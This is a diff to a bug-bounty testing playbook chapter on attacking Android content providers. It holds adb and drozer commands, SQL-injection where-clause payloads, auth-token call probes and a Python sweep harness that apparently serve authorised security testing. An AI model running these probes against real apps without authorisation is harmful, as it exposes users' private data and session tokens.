@@ -12,7 +12,7 @@
 | **Milestones** | M3, M4, M5 |
 | **VRT ceiling** | **P1** — `server_side_injection.file_inclusion.local` for the arbitrary-read primitive and `server_side_injection.sql_injection` for the injection. Both are defined server-side, so the honest filing is to name the closest accurate node (`broken_access_control.exposed_sensitive_android_intent`, VARIES, CWE-927) *and* state the P1 analogue with the reachability proof, then request the severity in the first body section. Never file a provider bug under `insecure_data_storage.*` — that branch is P5/P4 and it throws the finding away. |
 | **Primary attacker model** | **AM-03** zero-permission local app. AM-04 where a grant must be obtained; AM-02 where a deep link drives the app's own ContentResolver; AM-05 for cross-account rows. |
-| **Maps to** | MASVS-PLATFORM, MASVS-STORAGE, MASVS-CODE · MASTG-TEST-0355, MASTG-TEST-0356, MASTG-TEST-0357, MASTG-TEST-0339, MASTG-TEST-0025, MASTG-TEST-0250 · MASTG-TECH-0148, MASTG-TECH-0159, MASTG-TECH-0163 · MASWE-0018, MASWE-0050, MASWE-0002, MASWE-0036 · CWE-89, CWE-20, CWE-73, CWE-200, CWE-306, CWE-926, CWE-927, CWE-939, CWE-940 · T1409, T1533, T1636, T1641 |
+| **Maps to** | MASVS-PLATFORM, MASVS-STORAGE, MASVS-CODE · MASTG-TEST-0355, MASTG-TEST-0356, MASTG-TEST-0357, MASTG-TEST-0339, MASTG-TEST-0025 (deprecated upstream), MASTG-TEST-0250 · MASTG-TECH-0148, MASTG-TECH-0159, MASTG-TECH-0163 · MASWE-0018, MASWE-0050, MASWE-0002, MASWE-0036 · CWE-89, CWE-20, CWE-73, CWE-200, CWE-306, CWE-926, CWE-927, CWE-939, CWE-940 · T1409, T1533, T1636, T1641 |
 
 ## Why this domain pays
 
@@ -52,7 +52,7 @@ can the app itself be made to call that method on the attacker's behalf?**
 
 ## Applicability probe
 
-Run once per engagement, after P2 has populated `$DEC` and `inventory/` has been generated **with `--all`** (without it `components.csv` omits non-exported providers that carry no grant — D07-056 and D07-065 still need them). `SERIAL` and `PKG` come from `engagement.json`.
+Run once per engagement, after P2 has populated `$DEC` and `inventory/` has been generated (`scripts/inventory.py` lists every provider, exported or not; `--all` only adds non-exported activities/services/receivers). `SERIAL` and `PKG` come from `engagement.json`.
 
 ```bash
 # 1. declared providers in the MERGED manifest (SDK-contributed providers included)
@@ -68,7 +68,7 @@ grep -rlE 'getContentResolver\(\)\.(openInputStream|openOutputStream|openFileDes
 adb -s "$SERIAL" shell dumpsys package providers | grep -F -A2 "$PKG" | tee logs/D07-probe.txt
 ```
 
-**Decision.** (1) > 0 → every outbound item applies to every authority, exported or not (D07-001..053, D07-056..061, D07-065..073, plus the NEW getType/Bundle-form/DocumentsProvider items); the `Requires: provider` tag is satisfied. (1) = 0 **and** (4) = 0 → the whole domain is n/a except the mechanics items D07-074..076, which are untouched. (1) = 0 and (4) > 0 → only the inbound items apply: D07-054, D07-055, D07-062, D07-063, D07-064. A mismatch between (1) and (2) is a `blocked` state (regenerate the inventory with `--all`), never a reason to proceed on the shorter list.
+**Decision.** (1) > 0 → every outbound item applies to every authority, exported or not (D07-001..053, D07-056..061, D07-065..073, D07-078..080); the `Requires: provider` tag is satisfied. (1) = 0 **and** (4) = 0 → the whole domain is n/a except the mechanics items D07-074..076, which are untouched. (1) = 0 and (4) > 0 → only the inbound items apply: D07-054, D07-055, D07-062, D07-063, D07-064. A mismatch between (1) and (2) is a `blocked` state (regenerate the inventory with `python3 scripts/inventory.py` against the merged manifest and re-count), never a reason to proceed on the shorter list.
 
 **n/a note text (whole domain):**
 `D07 n/a — merged manifest declares 0 <provider> elements (grep -c '<provider' $DEC/apktool/AndroidManifest.xml = 0, logs/D07-probe.txt) and $DEC/jadx/sources contains no ContentResolver open*/query call, OpenableColumns, DocumentsContract or EXTRA_STREAM use (grep -rl … | wc -l = 0). D07-074..076 are mechanics and stay untouched. Re-run this probe if a later build or a merged SDK manifest adds a provider.`
@@ -106,6 +106,8 @@ adb -s "$SERIAL" shell dumpsys package providers | grep -F -A2 "$PKG" | tee logs
    Rare, and Critical when present.
 11. **Everything else.** Slices, cloud media, persistable-grant retention, authority collisions.
 
+**Conventions for every How block in this chapter.** (1) `SERIAL` is the lab device's serial from `engagement.json` (`adb devices -l`); every `adb` and `frida` call pins it (`adb -s "$SERIAL"`, `frida -D "$SERIAL"`), because with two devices attached an unpinned call fails with `more than one device/emulator` or picks one silently. (2) `$DEC` is `$E/decompiled`, populated in P2 (`$DEC/jadx/sources`, `$DEC/apktool`); never re-decompile into an ad-hoc `out/`. (3) **Device-shell quoting.** `adb shell` joins its arguments into one unquoted string that the device's `sh` re-parses: an unprotected `*` globs `/`, `(`, `)` and `;` break the command, and an inner `'...'` SQL literal loses its quotes — so a payload that is quoted only for the local shell arrives changed, and the provider's "not injectable" is an artefact. Wrap the whole device command in one local double-quoted argument and escape the inner double quotes, e.g. `adb -s "$SERIAL" shell "content query --uri $A --where \"1=1) OR (1=1\""` — `$A` expands locally, the device shell sees `--where "1=1) OR (1=1"`. Anything longer than a line goes through the D07-009 harness, which builds the device command with `shlex.join`. (4) **Shell UID.** Write `adb -s "$SERIAL" shell id` into the log header of every session: uid 2000 (`shell`) on a user build or after `adb unroot`; **uid 0** on a rooted lab device or after `adb root`. Root bypasses the export check, so a root-shell positive on an `exported="false"` provider is discovery only (D07-007).
+
 ## Items
 
 ### D07-001 · Enumerate every declared authority with all six access-control attributes
@@ -122,21 +124,23 @@ adb -s "$SERIAL" shell dumpsys package providers | grep -F -A2 "$PKG" | tee logs
   `writePermission` and `grantUriPermissions` together. Reading `exported` alone produces a wrong inventory,
   because `readPermission`/`writePermission` override `permission` per-direction and `grantUriPermissions`
   re-opens a provider that is not exported.
-- **How:**
+- **How:** The authority list comes from the **merged manifest** in `$DEC` (P2 has populated it), cross-checked
+  against `inventory/components.csv` — the generator lists every provider, exported or not, so the two counts
+  must agree; a shorter inventory is a stale or partial generation, never the list to work from.
 ```bash
-apktool d -f target.apk -o out/
-xmlstarlet sel -t -m "//provider" \
+grep -c '<provider' "$DEC/apktool/AndroidManifest.xml"; awk -F, '$2=="provider"' inventory/components.csv | wc -l   # must be equal
+xmlstarlet sel -N android=http://schemas.android.com/apk/res/android -t -m "//provider" \
   -v "@android:name" -o " | auth=" -v "@android:authorities" \
   -o " | exported=" -v "@android:exported" \
   -o " | perm=" -v "@android:permission" \
   -o " | read=" -v "@android:readPermission" \
   -o " | write=" -v "@android:writePermission" \
-  -o " | grantUri=" -v "@android:grantUriPermissions" -n out/AndroidManifest.xml
+  -o " | grantUri=" -v "@android:grantUriPermissions" -n "$DEC/apktool/AndroidManifest.xml"
 # binary-manifest fallback, no apktool
 aapt2 d xmltree target.apk --file AndroidManifest.xml | grep -A8 "E: provider"
 ```
-- **Proof:** A table with one row per authority and a filled value (or an explicit `-`) in all six columns.
-  Any row with `exported=true` and every permission column empty is an immediate step-2 candidate.
+- **Proof:** A table with one row per authority and a filled value (or an explicit `-`) in all six columns,
+  and the row count equals the manifest's `<provider>` count. Any row with `exported=true` and every permission column empty is an immediate step-2 candidate.
 - **Escalation:** Feeds D07-005 (three-verb probe) and D07-024 (grants). Authorities belonging to bundled
   SDKs go to D07-003 and -> D18 SDK configuration.
 - **Ruled out when:** Every `<provider>` carries `exported="false"` **and** `grantUriPermissions` is absent
@@ -162,7 +166,7 @@ aapt2 d xmltree target.apk --file AndroidManifest.xml | grep -A8 "E: provider"
 ```bash
 aapt dump badging target.apk | grep -E 'sdkVersion|targetSdkVersion'
 # confirm the platform's own view rather than the manifest's
-adb shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Service Resolver Table/p'
+adb -s "$SERIAL" shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Service Resolver Table/p'
 ```
 - **Proof:** Either `targetSdkVersion:'16'` or lower in badging output *plus* `dumpsys` showing
   `exported=true` on a provider with no manifest attribute (the LEGACY case), or a modern target with an
@@ -189,11 +193,11 @@ adb shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Se
   Nobody on the client's team has reviewed those paths XMLs.
 - **How:**
 ```bash
-adb shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Service Resolver Table/p' \
+adb -s "$SERIAL" shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/Service Resolver Table/p' \
   | tee /tmp/runtime_authorities.txt
-grep -oE 'android:authorities="[^"]+"' out/AndroidManifest.xml | sed 's/.*="//; s/"//' | tr ';' '\n' | sort -u
+grep -oE 'android:authorities="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | sed 's/.*="//; s/"//' | tr ';' '\n' | sort -u
 # any provider class NOT under the app's own package prefix is SDK-contributed
-grep -oE 'android:name="[^"]+Provider"' out/AndroidManifest.xml | sed 's/.*="//; s/"//' \
+grep -oE 'android:name="[^"]+Provider"' "$DEC/apktool/AndroidManifest.xml" | sed 's/.*="//; s/"//' \
   | grep -v '^com\.target\.app'
 ```
 - **Proof:** A list of authorities whose implementing class lives outside the app's package namespace,
@@ -217,7 +221,7 @@ grep -oE 'android:name="[^"]+Provider"' out/AndroidManifest.xml | sed 's/.*="//;
   resources. A provider you cannot address returns nothing and reads as a false negative.
 - **How:**
 ```bash
-grep -rnE 'addURI\(|UriMatcher|content://|CONTENT_URI|buildUpon\(\)' out/sources/ | sort -u | head -80
+grep -rnE 'addURI\(|UriMatcher|content://|CONTENT_URI|buildUpon\(\)' "$DEC/jadx/sources/" | sort -u | head -80
 # string-derived candidates, then the ones that actually answer
 drozer> run app.provider.finduri com.target.app
 drozer> run scanner.provider.finduris -a com.target.app
@@ -238,7 +242,7 @@ drozer> run scanner.provider.finduris -a com.target.app
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.file_inclusion.local` (P1) where it yields file bytes; `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the access itself |
+| **VRT** | `server_side_injection.file_inclusion.local` (P1) where it yields file bytes; `broken_access_control.exposed_sensitive_android_intent` (varies) for the access itself |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider, device |
@@ -250,14 +254,14 @@ drozer> run scanner.provider.finduris -a com.target.app
 - **How:**
 ```bash
 A=content://com.target.app.provider
-adb shell content query  --uri $A/items
-adb shell content query  --uri $A/items --projection "*" --where "1=1" --sort "_id"
-adb shell content insert --uri $A/items --bind name:s:probe7x2k9qd --bind _id:i:99999
-adb shell content update --uri $A/items --bind name:s:probe7x2k9qd --where "_id=1"
-adb shell content delete --uri $A/items --where "_id=99999"
-adb shell content call   --uri $A --method probe --arg x --extra k:s:v
-adb shell content read   --uri $A/items/1
-adb shell content gettype --uri $A/items
+adb -s "$SERIAL" shell content query  --uri $A/items
+adb -s "$SERIAL" shell "content query  --uri $A/items --projection \"*\" --where \"1=1\" --sort \"_id\""
+adb -s "$SERIAL" shell content insert --uri $A/items --bind name:s:probe7x2k9qd --bind _id:i:99999
+adb -s "$SERIAL" shell "content update --uri $A/items --bind name:s:probe7x2k9qd --where \"_id=1\""
+adb -s "$SERIAL" shell "content delete --uri $A/items --where \"_id=99999\""
+adb -s "$SERIAL" shell content call   --uri $A --method probe --arg x --extra k:s:v
+adb -s "$SERIAL" shell content read   --uri $A/items/1
+adb -s "$SERIAL" shell content gettype --uri $A/items
 # --bind types: s=string i=int l=long f=float d=double b=boolean
 ```
 - **Proof:** Six labelled command outputs. The finding is the pair: a `SecurityException` on one verb and a
@@ -290,7 +294,7 @@ adb shell content gettype --uri $A/items
 |---|---|---|
 | `SecurityException: Permission Denial: opening provider ... requires <perm>` | AMS, provider-level | Gate held. True negative for this verb. |
 | `SecurityException: Permission Denial: ... not exported from uid` | AMS, export check | Gate held. |
-| `Failed to find provider info for <auth>` / `Unknown authority` | package resolution | You never reached the app at all — often package visibility (targetSdk 30+), not permission. Re-test with `<queries>` declared. |
+| CLI: `Error while accessing provider:<auth>` / `Could not find provider: <auth>`; **from an app: `query()` returns `null` with no exception**, `openInputStream()` throws `FileNotFoundException: No content provider: content://...` | package resolution | You never reached the app at all — usually package visibility (caller targetSdk 30+, D07-008), not permission. A null Cursor is this row, not "readable". Re-test with `<queries>` declared. |
 | `IllegalArgumentException: Unknown URI/URL content://...` | inside `query()`/`UriMatcher` | **You passed the permission gate.** Wrong path, right authority. Go back to D07-004. |
 | `SQLiteException: unrecognized token` / `no such column` | inside the SQL layer | You passed the gate *and* your string reached SQL. Go to D07-038. |
 | `FileNotFoundException: No files supported by provider at ...` | inside `openFile()` | You passed the gate; it is a cursor provider, not a file provider. |
@@ -298,7 +302,7 @@ adb shell content gettype --uri $A/items
 
 ```bash
 # minimal well-formed probe, for the authority root with no path
-adb shell content query --uri content://com.target.app.provider 2>&1 | head -3
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider 2>&1 | head -3
 # then the same from a stub app with <queries> declared, to separate visibility from permission
 ```
 - **Proof:** The exact exception text plus the layer it belongs to, recorded per authority per verb.
@@ -322,10 +326,15 @@ adb shell content query --uri content://com.target.app.provider 2>&1 | head -3
   A finding proved only from `adb` has not established AM-03, and a triager who reproduces it from an app
   and gets a denial will close it. Conversely, `shell` is *unaffected* by scoped storage and package
   visibility, which is exactly why it is the right discovery tool — just not the right proof tool.
+  On a rooted lab device, or after `adb root`, the shell is **uid 0**, and root bypasses the export check
+  entirely: a `content query` that succeeds on an `exported="false"` provider from that shell is a root
+  artefact, not reachability. Run `adb -s "$SERIAL" shell id` first and record the uid line next to every
+  shell-side provider result; a uid-0 result is discovery-only and must be re-proved from the probe app
+  (D07-008, D07-077) or from a stock, non-root device shell.
 - **How:**
 ```bash
 # discovery (shell UID)
-adb shell content query --uri content://com.target.app.provider/items
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/items
 # proof (app UID) — minimal stub, no permissions in its manifest at all
 ```
 ```java
@@ -339,7 +348,8 @@ Log.i("poc", DatabaseUtils.dumpCursorToString(c));
   -> downgrade or drop, and say which you used.
 - **Escalation:** n/a — this is the gate that keeps the finding alive at triage.
 - **Ruled out when:** The app-UID reproduction throws `SecurityException` while `shell` succeeds. Record it
-  as a shell-only artefact, not a finding.
+  as a shell-only artefact, not a finding. A shell-side positive obtained with `uid=0(root)` in the `id`
+  output is never carried into a finding or a ruled-out row.
 
 ### D07-008 · Declare `<queries>` in the PoC app, or you will manufacture your own false negative
 
@@ -372,10 +382,10 @@ Log.i("poc", DatabaseUtils.dumpCursorToString(c));
 ```
   Then confirm the filtering state at runtime rather than assuming it:
 ```bash
-adb shell dumpsys package queries | sed -n '/com.poc.probe/,/^$/p'
+adb -s "$SERIAL" shell dumpsys package queries | sed -n '/com.poc.probe/,/^$/p'
 aapt dump badging poc.apk | grep -E 'targetSdkVersion|sdkVersion'
 # capture the exact failure string in both configurations
-adb logcat -c && adb shell am start -n com.poc.probe/.MainActivity && adb logcat -d | grep -i 'poc\|Unknown URL\|Permission Denial'
+adb -s "$SERIAL" logcat -c && adb -s "$SERIAL" shell am start -n com.poc.probe/.MainActivity && adb -s "$SERIAL" logcat -d | grep -i 'poc\|Unknown URL\|Permission Denial'
 ```
 - **Proof:** The same URI, the same PoC APK, built twice — once with the `<queries>` block and once
   without. One resolves and returns rows; the other fails at the resolution layer. Put both outputs in the
@@ -406,18 +416,24 @@ adb logcat -c && adb shell am start -n com.poc.probe/.MainActivity && adb logcat
   computed range goes to Python with per-iteration logging and an explicit final count.
 ```python
 #!/usr/bin/env python3
-import subprocess, itertools, sys
-AUTHS = [a.strip() for a in open('/tmp/authorities.txt') if a.strip()]
+import subprocess, itertools, sys, os, shlex
+SERIAL = os.environ["SERIAL"]                      # pinned device; never a bare adb
+AUTHS = [a.strip() for a in open('logs/D07-authorities.txt') if a.strip()]
 VARIANTS = ["", "/", "//", "/1", "/x", "/.", "/%2e%2e%2f"]
 expected = len(AUTHS) * len(VARIANTS); done = 0
 for auth, v in itertools.product(AUTHS, VARIANTS):
     uri = f"content://{auth}{v}"
     try:
-        r = subprocess.run(["adb","shell","content","query","--uri",uri],
+        # shlex.join quotes for the device's POSIX shell (adb re-parses the joined string there)
+        r = subprocess.run(["adb","-s",SERIAL,"shell", shlex.join(["content","query","--uri",uri])],
                            capture_output=True, text=True, timeout=20)
         out = (r.stdout + r.stderr).strip().splitlines()[:1]
-        verdict = ("CLOSED" if "SecurityException" in "".join(out)
-                   else "ERR" if "Exception" in "".join(out) else "**READABLE**")
+        s = "\n".join(out)
+        verdict = ("ADB-ERR" if s.startswith(("error:", "adb:")) or (r.returncode != 0 and not s)
+                   else "CLOSED" if "SecurityException" in s
+                   else "ERR" if "Exception" in s
+                   else "NO-RESULT" if "No result found" in s      # null or empty cursor: NOT readable
+                   else "**READABLE**" if s.startswith("Row:") else "UNCLASSIFIED")
         print(f"{uri:<70} {verdict} {out}")
     except Exception as e:
         print(f"{uri:<70} TIMEOUT/ERR {e}", file=sys.stderr)
@@ -425,7 +441,9 @@ for auth, v in itertools.product(AUTHS, VARIANTS):
 print(f"\n[count] expected={expected} executed={done}", file=sys.stderr)
 assert done == expected, "loop ate probes"
 ```
-- **Proof:** `expected == executed` printed at the end of every sweep, quoted in the working notes.
+- **Proof:** `expected == executed` printed at the end of every sweep, quoted in the working notes. Only
+  `Row:` lines are positives; `No result found.` is a null or empty cursor (D07-006 row 3 from the shell),
+  and an `ADB-ERR`/`UNCLASSIFIED` verdict is a harness failure to fix, never a result.
 - **Escalation:** n/a.
 - **Ruled out when:** n/a — this is unconditional. A sweep without a probe count is not evidence of absence.
 
@@ -442,13 +460,17 @@ assert done == expected, "loop ate probes"
 
 - **Test:** "The scanner found nothing" is not a negative. A ruled-out entry must carry the evidence that
   killed the hypothesis, per authority and per verb, from an app UID.
-- **How:**
+- **How:** The negative comes from the shared probe app (D07-077: positive control first, the full verb
+  matrix, `Throwable.toString()` verbatim), one run per authority:
 ```bash
-for A in $(cat /tmp/authorities.txt); do
-  echo "=== $A"
-  adb shell content query --uri "content://$A" 2>&1 | head -2
-  adb shell content call  --uri "content://$A" --method probe 2>&1 | head -2
-done | tee /tmp/provider_negatives.txt
+for A in $(cat logs/D07-authorities.txt); do
+  adb -s "$SERIAL" shell am start -S -n com.sanehunters.probe/.MainActivity --es run provider --es victim "$PKG" --es authority "$A"
+  sleep 5; adb -s "$SERIAL" logcat -d -s PROBE:V | grep -F "content://$A"
+done | tee logs/D07-010.txt
+# discovery only (shell UID — uid 2000 or, on a rooted lab device, uid 0): never the basis of a ruled-out row
+for A in $(cat logs/D07-authorities.txt); do
+  echo "=== $A"; adb -s "$SERIAL" shell "content query --uri content://$A" 2>&1 | head -2
+done
 ```
 - **Proof:** A table of `authority | verb | exception string | date`, e.g.
   `com.target.app.sync | query | java.lang.SecurityException: Permission Denial: opening provider
@@ -463,10 +485,10 @@ done | tee /tmp/provider_negatives.txt
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 on a secondary user / work profile |
-| **Applies to** | Android 5+ multi-user; Private Space Android 15+ |
-| **Requires** | provider, device, api>=35 |
+| **Applies to** | Android 5+ multi-user; the Private Space half needs a device on API 35+ (skip that half, not the item, below it) |
+| **Requires** | provider, device |
 | **Maps to** | Google's Android & Google Devices scope: "Multi-User & Private Space: Cross-user sensitive data access" |
 
 - **Test:** Everyone queries as user 0. Cross-user data access is an explicitly purchased impact class, and
@@ -474,26 +496,29 @@ done | tee /tmp/provider_negatives.txt
   caller in the work profile or a secondary user.
 - **How:**
 ```bash
-adb shell pm list users
-adb shell am get-current-user
-adb shell content query --user 0  --uri content://com.target.app.provider/items
-adb shell content query --user 10 --uri content://com.target.app.provider/items
+grep -nE 'android:singleUser="true"' "$DEC/apktool/AndroidManifest.xml"   # one instance in user 0 serves all users
+adb -s "$SERIAL" shell pm list users
+adb -s "$SERIAL" shell am get-current-user
+adb -s "$SERIAL" shell content query --user 0  --uri content://com.target.app.provider/items
+adb -s "$SERIAL" shell content query --user 10 --uri content://com.target.app.provider/items
 # the file form of the same question
-adb shell content read --uri 'content://com.target.app.fileprovider/files/x' --user 10
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/files/x' --user 10
 # Private Space: lock it, then retry — apps inside should be stopped
 ```
 - **Proof:** Rows returned with `--user 10` that belong to user 0, or the converse. A `Permission Denial`
   naming the user id is itself a useful data point for the ruled-out register.
 - **Escalation:** -> D15 if the rows carry server object ids you can then enumerate across accounts.
 - **Ruled out when:** The provider is not installed for the secondary user (`pm list packages --user 10`
-  does not list it), or `--user 10` returns only that user's own rows with a distinct dataset.
+  does not list it), or `--user 10` returns only that user's own rows with a distinct dataset — and no
+  provider declares `singleUser="true"` (if one does, the cross-user read is by design and the question
+  becomes whether it keys rows on `UserHandle` — test it).
 
 ### D07-012 · `readPermission` / `writePermission` asymmetry
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider |
@@ -504,11 +529,11 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/x' --u
   leaves `query` open. Do not reason about it — test both.
 - **How:**
 ```bash
-grep -nE 'android:(read|write)Permission|android:permission=' out/AndroidManifest.xml
+grep -nE 'android:(read|write)Permission|android:permission=' "$DEC/apktool/AndroidManifest.xml"
 drozer> run app.provider.info -a com.target.app -v     # "Required Permission - Read: null" is the tell
-adb shell content query  --uri content://com.target.app.provider/settings
-adb shell content update --uri content://com.target.app.provider/settings \
-  --bind value:s:0 --where "name='pinning_enabled'"
+adb -s "$SERIAL" shell content query  --uri content://com.target.app.provider/settings
+adb -s "$SERIAL" shell "content update --uri content://com.target.app.provider/settings \
+  --bind value:s:0 --where \"name='pinning_enabled'\""
 ```
 - **Proof:** `Required Permission - Read: null` alongside a non-null write permission (or the inverse), plus
   the verb that succeeds. Note the framework's own warning applies: a write permission alone is not
@@ -523,7 +548,7 @@ adb shell content update --uri content://com.target.app.provider/settings \
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider |
@@ -537,7 +562,7 @@ adb shell content update --uri content://com.target.app.provider/settings \
 ```bash
 python3 - <<'PY'
 import xml.dom.minidom as m
-d = m.parse('out/AndroidManifest.xml')
+d = m.parse('"$DEC/apktool/AndroidManifest.xml"')
 for p in d.getElementsByTagName('provider'):
     g = lambda k: p.getAttribute('android:'+k) or '-'
     perm, rd, wr = g('permission'), g('readPermission'), g('writePermission')
@@ -556,7 +581,7 @@ PY
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider |
@@ -569,11 +594,11 @@ PY
   and the permission reviewer reads the `<permission>` line; nobody joins them.
 - **How:**
 ```bash
-grep -nE '<permission |protectionLevel' out/AndroidManifest.xml
-adb shell dumpsys package com.target.app | sed -n '/declared permissions:/,/^$/p'
+grep -nE '<permission |protectionLevel' "$DEC/apktool/AndroidManifest.xml"
+adb -s "$SERIAL" shell dumpsys package com.target.app | sed -n '/declared permissions:/,/^$/p'
 # then actually take it, from a stub app that declares <uses-permission> for it:
-adb shell pm list permissions -d -g | grep -A2 com.target.app
-adb shell dumpsys package com.poc.stub | grep -A20 'requested permissions'
+adb -s "$SERIAL" shell pm list permissions -d -g | grep -A2 com.target.app
+adb -s "$SERIAL" shell dumpsys package com.poc.stub | grep -A20 'requested permissions'
 ```
 - **Proof:** `protectionLevel=normal` (or `0` in dumpsys) on the guarding permission, followed by the stub
   app holding it after a plain install and reading the provider.
@@ -588,7 +613,7 @@ adb shell dumpsys package com.poc.stub | grep -A20 'requested permissions'
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it returns or sets auth state; `broken_access_control.exposed_sensitive_android_intent` (VARIES) otherwise |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it returns or sets auth state; `broken_access_control.exposed_sensitive_android_intent` (varies) otherwise |
 | **Attacker** | AM-03 |
 | **Applies to** | all providers overriding `call()` |
 | **Requires** | provider |
@@ -601,9 +626,9 @@ adb shell dumpsys package com.poc.stub | grep -A20 'requested permissions'
   read permission — so test `call()` even on providers you believe are read-only.
 - **How:**
 ```bash
-adb shell content call --uri content://com.target.app.provider --method getAuthToken --arg current
-adb shell content call --uri content://com.target.app.provider --method exportDatabase
-adb shell content call --uri content://com.target.app.provider --method setAuthToken --arg attacker
+adb -s "$SERIAL" shell content call --uri content://com.target.app.provider --method getAuthToken --arg current
+adb -s "$SERIAL" shell content call --uri content://com.target.app.provider --method exportDatabase
+adb -s "$SERIAL" shell content call --uri content://com.target.app.provider --method setAuthToken --arg attacker
 drozer> run app.provider.call content://com.target.app.provider \
         --method getAuthToken --argument current \
         --bundle "S.account=victim@example.com;B.refresh=false"
@@ -613,7 +638,7 @@ drozer> run app.provider.call content://com.target.app.provider \
   observable side effect. A returned Bundle from an app UID holding no permissions is the whole finding.
 - **Escalation:** A token-returning method -> D13/D15 account takeover. A setter -> D23 entitlement grant.
   A dump method -> D07-065 side effects.
-- **Ruled out when:** The provider does not override `call()` (`grep -rn 'public Bundle call(' out/sources/`
+- **Ruled out when:** The provider does not override `call()` (`grep -rn 'public Bundle call(' "$DEC/jadx/sources/"`
   returns nothing for that class and its superclasses), or every branch of the `call()` switch starts with
   an enforced `getCallingPackage()`/`checkCallingPermission()` gate whose failure path throws.
 
@@ -622,7 +647,7 @@ drozer> run app.provider.call content://com.target.app.provider \
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all providers that authorise by path |
 | **Requires** | provider |
@@ -636,11 +661,11 @@ drozer> run app.provider.call content://com.target.app.provider \
 - **How:**
 ```bash
 # 1. confirm the app authorises by path
-xmllint --format out/AndroidManifest.xml | sed -n '/<provider/,/<\/provider>/p' | grep -n 'path-permission'
+xmllint --format "$DEC/apktool/AndroidManifest.xml" | sed -n '/<provider/,/<\/provider>/p' | grep -n 'path-permission'
 # 2. confirm the logic lives in call()
-grep -rnA40 'public Bundle call(' out/sources/
+grep -rnA40 'public Bundle call(' "$DEC/jadx/sources/"
 # 3. invoke a method whose equivalent URI path is permission-protected
-adb shell content call --uri content://com.target.app.provider --method readKeys
+adb -s "$SERIAL" shell content call --uri content://com.target.app.provider --method readKeys
 ```
 - **Proof:** `content query --uri content://.../keys` returning `Permission Denial` and
   `content call --method readKeys` returning the same data in a Bundle. The pair is the finding.
@@ -665,11 +690,11 @@ adb shell content call --uri content://com.target.app.provider --method readKeys
 - **How:**
 ```bash
 # the switch arms, scoped to the call() body
-grep -rn -A60 'public Bundle call(' out/sources/ \
+grep -rn -A60 'public Bundle call(' "$DEC/jadx/sources/" \
   | grep -oE '(case |equals\(|hashCode\(\) == )[^;]*"[A-Za-z_][A-Za-z0-9_]{2,48}"' \
   | grep -oE '"[A-Za-z_][A-Za-z0-9_]{2,48}"' | sort -u
 # R8 often compiles the switch to a hashCode()+equals() ladder — read the ladder, not just `case`
-jadx-gui out/target.apk   # navigate to the provider class, read call() top to bottom
+jadx-gui "$DEC/jadx"   # navigate to the provider class, read call() top to bottom
 ```
   Then drive each name with a probe bundle and record which ones do not throw.
 - **Proof:** The extracted method-name list plus the per-method result (`Bundle[{...}]`, `Bundle[{}]`,
@@ -682,9 +707,9 @@ jadx-gui out/target.apk   # navigate to the provider class, read call() top to b
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the access; `server_side_injection.file_inclusion.local` (P1) where `openTypedAssetFile` yields file bytes |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for the access; `server_side_injection.file_inclusion.local` (P1) where `openTypedAssetFile` yields file bytes |
 | **Attacker** | AM-03 |
-| **Applies to** | all; probe from a PoC app, because `adb shell content` cannot reach most of these |
+| **Applies to** | all; probe from the shared probe app (contract in D07-077), because `adb shell content` cannot reach most of these |
 | **Requires** | provider, device |
 | **Maps to** | QARK `INSECURE_FUNCTIONS_NAMES = ("call",)` — "The framework does no permission checking on this entry into the content provider besides the basic ability for the application to get access to the provider at all" — generalised to the rest of the overridable surface; MASTG-TECH-0148 |
 
@@ -733,7 +758,7 @@ try { Log.i("poc","refresh="      + cr.refresh(u,null,null)); }                 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) where the batch flips a security-relevant column; `broken_access_control.exposed_sensitive_android_intent` (VARIES) otherwise |
+| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) where the batch flips a security-relevant column; `broken_access_control.exposed_sensitive_android_intent` (varies) otherwise |
 | **Attacker** | AM-03 |
 | **Applies to** | providers that override `bulkInsert()` or `applyBatch()`; requires a PoC app — the CLI has no batch verb |
 | **Requires** | provider, device |
@@ -785,7 +810,7 @@ Log.i("poc","bulkInsert rows=" + n);
 | | |
 |---|---|
 | **Severity ceiling** | High |
